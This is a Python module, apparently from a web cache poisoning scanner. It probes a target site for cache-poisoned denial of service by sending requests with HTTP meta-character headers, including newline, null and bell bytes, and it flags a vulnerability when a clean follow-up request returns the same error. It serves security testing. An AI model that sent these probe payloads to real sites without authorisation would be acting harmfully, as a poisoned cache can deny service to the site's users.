#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning with HTTP Metachar Character (HMC)
https://cpdos.org/#HMC
"""

from modules.utils import random, requests, configure_logger, human_time

logger = configure_logger(__name__)

VULN_NAME = "HTTP Meta Character"

def check_meta_character(url, s, main_status_code, authent, meta_character, human):
    """Probe and Verify the server for a meta character vulnerability"""

    logger.debug("Testing for %s vulnerabilities", VULN_NAME)

    url = f"{url}{random.randrange(99)}"
    headers = {"X-Metachar-Header": meta_character}
    probe = s.get(
        url,
        headers=headers,
        timeout=10,
        verify=False,
        auth=authent,
        allow_redirects=False,
    )

    reason = ""
    if probe.status_code in [400, 413, 500] and probe.status_code != main_status_code:
        control = s.get(url, verify=False, timeout=10, auth=authent)
        if (
            control.status_code == probe.status_code
            and control.status_code != main_status_code
        ):
            reason = f"\033[34m{main_status_code} > {control.status_code}\033[0m"

    if reason:
        payload = f"PAYLOAD: {headers}"
        print(
            f"\033[31m └── [VULNERABILITY CONFIRMED]\033[0m | HMC | \033[34m{url}\033[0m | {reason} | {payload}"
        )
    human_time(human)


def HMC(url, s, req_main, authent, human): # pylint: disable=invalid-name
    """Prepare the list of meta characters to check for"""
    main_status_code = req_main.status_code

    meta_characters = [
        r"\n",
        r"\a",
        r"\r",
        r"\0",
        r"\b",
        r"\e",
        r"\v",
        r"\f",
        r"\u0000",
        "\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07\x07metahttptest",
    ]
    for meta_character in meta_characters:
        try:
            check_meta_character(url, s, main_status_code, authent, meta_character, human)

        except requests.exceptions.ConnectionError as e:
            logger.exception(e)

        print(
            f" \033[34m {VULN_NAME} : {meta_character.encode(encoding='UTF-8')}\033[0m\r",
            end="",
        )
        print("\033[K", end="")
